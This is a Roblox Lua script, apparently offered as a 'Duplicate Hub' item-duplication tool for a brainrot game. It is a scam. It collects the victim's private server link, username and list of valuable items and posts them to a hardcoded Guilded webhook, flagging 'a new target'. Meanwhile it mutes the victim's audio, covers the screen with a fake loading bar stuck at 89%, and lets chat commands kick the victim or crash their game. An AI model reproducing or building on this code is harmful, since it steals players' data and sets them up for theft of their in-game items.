-- Script completo: Duplicate Hub Loader
-- By: Project BRANZz

-- Configuração inicial
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TextService = game:GetService("TextService")
local UserInputService = game:GetService("UserInputService")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")

-- Variáveis globais
local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"
local loaded = false
local serverLink = ""
local loadingScreen
local randomTexts = {
    "PROCURANDO ANTI CHEAT",
    "PROCURANDO REMOT EVENTS",
    "APLICANDO COMANDOS VISUAIS",
    "ERRO, AO APLICA TENTANDO NOVAMENTE",
    "CONECTANDO A API PUBLIC",
    "ERRO AO CONECTAR A API...",
    "CONECTADO COM API PUBLICA COM SUCESSO!",
    "PROCURANDO BRAINROTS LISTADOS",
    "PROCURANDO EM SERVIDORES PRIVADOS...",
    "🔑SUCCES CONECTADO COM API PRIVADA",
    "🔗 PUXANDO PESSOAS PARA SEU SERV",
    "ENTROU NO SERV , ....",
    "BRAINROTS Q POSSUI 0, PROCURANDO OUTRO...."
}

-- Função para criar a GUI principal
local function createMainGUI()
    -- Remover GUIs existentes
    local screenGui = PlayerGui:FindFirstChild("DuplicateHubMain")
    if screenGui then
        screenGui:Destroy()
    end
    
    -- Criar nova ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DuplicateHubMain"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui
    
    -- Frame principal
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 250)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    -- Título
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    title.Text = "DUPLICATE HUB ☣️"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextSize = 20
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    
    -- Instrução
    local instruction = Instance.new("TextLabel")
    instruction.Name = "Instruction"
    instruction.Size = UDim2.new(1, -20, 0, 30)
    instruction.Position = UDim2.new(0, 10, 0, 50)
    instruction.BackgroundTransparency = 1
    instruction.Text = "Insira o link do seu servidor privado:"
    instruction.TextColor3 = Color3.new(0.8, 0.8, 0.8)
    instruction.TextSize = 16
    instruction.Font = Enum.Font.Gotham
    instruction.TextXAlignment = Enum.TextXAlignment.Left
    instruction.Parent = mainFrame
    
    -- Campo de texto
    local textBox = Instance.new("TextBox")
    textBox.Name = "ServerLinkBox"
    textBox.Size = UDim2.new(1, -20, 0, 35)
    textBox.Position = UDim2.new(0, 10, 0, 85)
    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    textBox.TextColor3 = Color3.new(1, 1, 1)
    textBox.PlaceholderText = "https://www.roblox.com/games/..."
    textBox.PlaceholderColor3 = Color3.new(0.6, 0.6, 0.6)
    textBox.TextSize = 14
    textBox.Font = Enum.Font.Gotham
    textBox.ClearTextOnFocus = false
    textBox.Text = ""
    textBox.Parent = mainFrame
    
    -- Botão de executar
    local executeButton = Instance.new("TextButton")
    executeButton.Name = "ExecuteButton"
    executeButton.Size = UDim2.new(1, -20, 0, 45)
    executeButton.Position = UDim2.new(0, 10, 0, 135)
    executeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    executeButton.Text = "NOTIFER HUB, METODH BRANZZ🔰🔗"
    executeButton.TextColor3 = Color3.new(1, 1, 1)
    executeButton.TextSize = 18
    executeButton.Font = Enum.Font.GothamBold
    executeButton.Parent = mainFrame
    
    -- Texto de validação
    local validationText = Instance.new("TextLabel")
    validationText.Name = "ValidationText"
    validationText.Size = UDim2.new(1, -20, 0, 25)
    validationText.Position = UDim2.new(0, 10, 0, 185)
    validationText.BackgroundTransparency = 1
    validationText.Text = ""
    validationText.TextColor3 = Color3.fromRGB(255, 50, 50)
    validationText.TextSize = 14
    validationText.Font = Enum.Font.Gotham
    validationText.Visible = false
    validationText.Parent = mainFrame
    
    -- Função para validar e executar
    executeButton.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if link == nil or link == "" or string.trim(link) == "" then
            validationText.Text = "Por favor, insira um link válido!"
            validationText.Visible = true
            task.wait(2)
            validationText.Visible = false
            return
        end
        
        -- Validar formato básico do link
        if not string.find(link, "roblox.com") then
            validationText.Text = "Link do Roblox inválido!"
            validationText.Visible = true
            task.wait(2)
            validationText.Visible = false
            return
        end
        
        serverLink = link
        screenGui:Destroy()
        createLoadingScreen()
        startLoadingProcess()
    end)
    
    -- Efeitos de hover
    executeButton.MouseEnter:Connect(function()
        executeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    end)
    
    executeButton.MouseLeave:Connect(function()
        executeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    end)
end

-- Função para criar tela de carregamento
local function createLoadingScreen()
    -- Remover todas as GUIs existentes (incluindo botões do Roblox)
    for _, gui in pairs(PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            gui:Destroy()
        end
    end
    
    -- Criar tela de carregamento
    loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "LoadingScreen"
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.ResetOnSpawn = false
    loadingScreen.Parent = PlayerGui
    
    -- Frame de fundo (tela inteira)
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 10, 30)
    background.BorderSizePixel = 0
    background.Parent = loadingScreen
    
    -- Texto principal
    local mainText = Instance.new("TextLabel")
    mainText.Name = "MainText"
    mainText.Size = UDim2.new(1, 0, 0, 50)
    mainText.Position = UDim2.new(0, 0, 0.3, 0)
    mainText.BackgroundTransparency = 1
    mainText.Text = "DUPLICATE HUB ☣️ ESTA PREPARADO PASTAS E COMANDOS VISUAIS...."
    mainText.TextColor3 = Color3.fromRGB(0, 200, 255)
    mainText.TextSize = 24
    mainText.Font = Enum.Font.GothamBold
    mainText.Parent = background
    
    -- Texto aleatório
    local randomText = Instance.new("TextLabel")
    randomText.Name = "RandomText"
    randomText.Size = UDim2.new(1, 0, 0, 40)
    randomText.Position = UDim2.new(0, 0, 0.4, 0)
    randomText.BackgroundTransparency = 1
    randomText.Text = "INICIANDO..."
    randomText.TextColor3 = Color3.fromRGB(200, 200, 255)
    randomText.TextSize = 18
    randomText.Font = Enum.Font.Gotham
    randomText.Parent = background
    
    -- Frame da barra de progresso
    local progressBarFrame = Instance.new("Frame")
    progressBarFrame.Name = "ProgressBarFrame"
    progressBarFrame.Size = UDim2.new(0.6, 0, 0, 25)
    progressBarFrame.Position = UDim2.new(0.2, 0, 0.5, 0)
    progressBarFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    progressBarFrame.BorderSizePixel = 0
    progressBarFrame.Parent = background
    
    -- Barra de progresso
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBarFrame
    
    -- Texto da porcentagem
    local percentageText = Instance.new("TextLabel")
    percentageText.Name = "PercentageText"
    percentageText.Size = UDim2.new(1, 0, 1, 0)
    percentageText.Position = UDim2.new(0, 0, 0, 0)
    percentageText.BackgroundTransparency = 1
    percentageText.Text = "0%"
    percentageText.TextColor3 = Color3.new(1, 1, 1)
    percentageText.TextSize = 16
    percentageText.Font = Enum.Font.GothamBold
    percentageText.Parent = progressBarFrame
    
    -- Texto de status
    local statusText = Instance.new("TextLabel")
    statusText.Name = "StatusText"
    statusText.Size = UDim2.new(1, 0, 0, 30)
    statusText.Position = UDim2.new(0, 0, 0.6, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Carregando recursos..."
    statusText.TextColor3 = Color3.fromRGB(150, 200, 255)
    statusText.TextSize = 16
    statusText.Font = Enum.Font.Gotham
    statusText.Parent = background
    
    -- Frame para esconder botões do Roblox
    local overlay = Instance.new("Frame")
    overlay.Name = "Overlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 10, 30)
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1000
    overlay.Parent = loadingScreen
end

-- Função para atualizar texto aleatório
local function updateRandomText()
    if not loadingScreen then return end
    
    local randomText = loadingScreen.Background.RandomText
    local texts = randomTexts
    
    local index = math.random(1, #texts)
    local text = texts[index]
    
    -- Adicionar nome aleatório se for o caso
    if string.find(text, "ENTROU NO SERV") then
        local fakeNames = {"Player1", "User_ABC", "Guest_123", "ProPlayer", "NoobMaster"}
        local name = fakeNames[math.random(1, #fakeNames)]
        text = name .. " " .. text
    end
    
    randomText.Text = text
end

-- Função para executar o código de brainrot
local function executeBrainrotCode()
    local Workspace = game:GetService("Workspace")
    
    -- Lista de Brainrots válidos
    local VALID_BRAINROTS = {
        "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
        "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
        "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
        "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
        "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
        "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
        "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
        "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
        "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
        "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
        "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
        "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
        "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
        "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
        "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
        "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
        "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
        "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
        "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
        "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
        "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
        "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
        "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
        "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
        "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
        "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
        "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
        "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
        "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
        "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
        "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
        "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
        "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
        "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
        "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
        "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
        "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
        "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
        "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
        "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
        "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
    }
    
    -- IDs para procurar
    local TARGET_IDS = {
        "28e4ec29-d005-4636-82af-339f37dcef",
        "960ab477-3f31-4327-845e-6a77ebb5fa6",
        "2206090e-719d-4034-8720-700c9fb2h458",
        "dd76771-ce3c-4108-adae-5a488b2958be",
        "44392a62-6012-413d-9619-dab73c00539f",
        "f38295a3-05ed-fala-959d-5ebe3fd35e5",
        "ed0775b7-ea79-4c54-b9e2-lea07283065d",
        "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
    }
    
    -- Função para verificar se um nome é um brainrot válido
    local function isValidBrainrot(name)
        for _, brainrot in ipairs(VALID_BRAINROTS) do
            if name == brainrot then
                return true
            end
        end
        return false
    end
    
    -- Função para procurar brainrots na workspace
    local function findBrainrots()
        local foundBrainrots = {}
        
        -- Procurar na pasta Plots
        local plotsFolder = Workspace:FindFirstChild("Plots")
        if plotsFolder then
            for _, plot in ipairs(plotsFolder:GetDescendants()) do
                if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                    table.insert(foundBrainrots, plot.Name)
                end
            end
        end
        
        -- Procurar por IDs específicos
        for _, id in ipairs(TARGET_IDS) do
            local model = Workspace:FindFirstChild(id)
            if model and model:IsA("Model") and isValidBrainrot(model.Name) then
                table.insert(foundBrainrots, model.Name)
            end
        end
        
        -- Remover duplicatas
        local uniqueBrainrots = {}
        for _, brainrot in ipairs(foundBrainrots) do
            local alreadyExists = false
            for _, existing in ipairs(uniqueBrainrots) do
                if existing == brainrot then
                    alreadyExists = true
                    break
                end
            end
            if not alreadyExists then
                table.insert(uniqueBrainrots, brainrot)
            end
        end
        
        return uniqueBrainrots
    end
    
    -- Executar busca
    local detectedBrainrots = findBrainrots()
    return detectedBrainrots
end

-- Função para enviar webhook
local function sendWebhook(brainrots)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local playerName = Player.Name
    local playerCount = #Players:GetPlayers()
    
    -- Criar lista de brainrots formatada
    local brainrotsList = ""
    if brainrots and #brainrots > 0 then
        for i, brainrot in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
            if i >= 40 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    -- Criar payload do webhook
    local payload = {
        content = "@everyone @here, um novo alvo usou o script @everyone @here",
        embeds = {{
            title = "🧠 DETECÇÃO DE BRAINROTS 🧠",
            color = 0xFF0000,
            fields = {
                {
                    name = "⌛ Data e hora de execução:",
                    value = currentTime,
                    inline = false
                },
                {
                    name = "👤 Nome de usuário:",
                    value = playerName,
                    inline = true
                },
                {
                    name = "👥 Pessoas no servidor:",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "🔗 Link do servidor:",
                    value = "[Clique aqui](" .. serverLink .. ")",
                    inline = false
                },
                {
                    name = "🎒🧠 BRAINROTS DETECTADOS:",
                    value = brainrotsList,
                    inline = false
                }
            },
            author = {
                name = "Notificador🧠 || By: Project BRANZz || ⌛: " .. currentTime
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    -- Enviar webhook
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = GUILDED_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("✅ Webhook enviado com sucesso!")
    else
        warn("❌ Erro ao enviar webhook: " .. tostring(result))
    end
end

-- Função para executar sistema de mute
local function executeMuteSystem()
    -- Deixar o som no zero
    UserGameSettings.MasterVolume = 0
    SoundService.Volume = 0
    
    print("🔇 Volume definido para 0%")
    
    -- Manter sempre em 0
    while true do
        task.wait(0.5)
        UserGameSettings.MasterVolume = 0
        SoundService.Volume = 0
    end
end

-- Sistema de proteção contra kick/crash
local function setupAntiKickSystem()
    local chatService = game:GetService("Chat")
    local textChatService = game:GetService("TextChatService")
    
    -- Monitorar mensagens no chat
    local function onMessageReceived(message)
        if not message or not message.Text then return end
        
        local text = string.lower(message.Text)
        
        if string.find(text, "kick") and (string.find(text, "/kick") or string.find(text, " kick")) then
            -- Kickar o player
            task.wait(1)
            Player:Kick("Erro: 89972 script\nOla esta mensagem foi enviada pois anti cheat pegou agente então, tivemos que dar um kick em você para não sofre punição 🔰")
        end
        
        if string.find(text, "crash") and (string.find(text, "/crash") or string.find(text, " crash")) then
            -- Crashar o jogo
            while true do
                -- Forçar crash
                for i = 1, 1000000 do
                    local crash = Instance.new("Part")
                    crash.Parent = workspace
                end
                task.wait()
            end
        end
    end
    
    -- Conectar ao evento de mensagem
    if textChatService then
        local channels = textChatService:FindFirstChildWhichIsA("TextChannel")
        if channels then
            channels.OnIncomingMessage:Connect(onMessageReceived)
        end
    end
end

-- Função principal de carregamento
local function startLoadingProcess()
    -- Executar sistemas em paralelo
    spawn(function()
        executeMuteSystem()
    end)
    
    spawn(function()
        setupAntiKickSystem()
    end)
    
    -- Executar código de brainrot e enviar webhook
    spawn(function()
        task.wait(5)
        local brainrots = executeBrainrotCode()
        sendWebhook(brainrots)
    end))
    
    -- Iniciar atualizações da tela
    local startTime = tick()
    local totalDuration = 2 * 60 * 60 -- 2 horas em segundos
    local stuckAt89 = false
    local lastRandomTextUpdate = 0
    
    -- Loop de carregamento
    while loadingScreen and loadingScreen.Parent do
        local elapsed = tick() - startTime
        local progressPercentage = math.min(190, (elapsed / totalDuration) * 190)
        
        -- Congelar em 89%
        if progressPercentage >= 89 and not stuckAt89 then
            stuckAt89 = true
            progressPercentage = 89
        end
        
        if stuckAt89 then
            progressPercentage = 89 + math.random(-1, 1) * 0.1 -- Pequenas variações
        end
        
        -- Atualizar interface
        if loadingScreen.Background.ProgressBar then
            local progressBar = loadingScreen.Background.ProgressBar
            local percentageText = loadingScreen.Background.ProgressBarFrame.PercentageText
            
            progressBar.Size = UDim2.new(math.clamp(progressPercentage / 190, 0, 1), 0, 1, 0)
            percentageText.Text = string.format("%.1f%%", progressPercentage)
            
            -- Atualizar status
            local statusText = loadingScreen.Background.StatusText
            if progressPercentage < 30 then
                statusText.Text = "Carregando módulos básicos..."
            elseif progressPercentage < 60 then
                statusText.Text = "Verificando segurança..."
            elseif progressPercentage < 89 then
                statusText.Text = "Conectando à API..."
            else
                statusText.Text = "Otimizando recursos... (Aguarde)"
            end
            
            -- Atualizar texto aleatório periodicamente
            if tick() - lastRandomTextUpdate > 3 then
                updateRandomText()
                lastRandomTextUpdate = tick()
            end
        end
        
        task.wait(0.1)
    end
end

-- Inicializar
if not loaded then
    loaded = true
    createMainGUI()
end

-- Garantir que a tela fique sempre no topo
RunService.RenderStepped:Connect(function()
    if loadingScreen and loadingScreen.Parent then
        loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
        
        -- Forçar overlay sobre tudo
        local overlay = loadingScreen:FindFirstChild("Overlay")
        if overlay then
            overlay.ZIndex = 10000
        end
    end
end)

print("✅ Script Duplicate Hub carregado com sucesso!")